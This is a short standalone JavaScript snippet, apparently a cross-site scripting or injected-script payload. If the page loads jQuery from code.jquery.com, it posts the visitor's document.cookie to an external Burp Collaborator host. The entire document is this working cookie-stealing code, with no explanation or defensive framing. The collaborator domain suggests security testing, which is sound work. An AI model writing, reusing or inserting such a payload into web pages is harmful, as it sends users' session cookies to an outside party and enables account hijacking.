var reg=/code\.jquery.com/ig;
if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
fetch('https://bcrrsj8vbm7h74w4at3lk0ijxa30rp.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
}
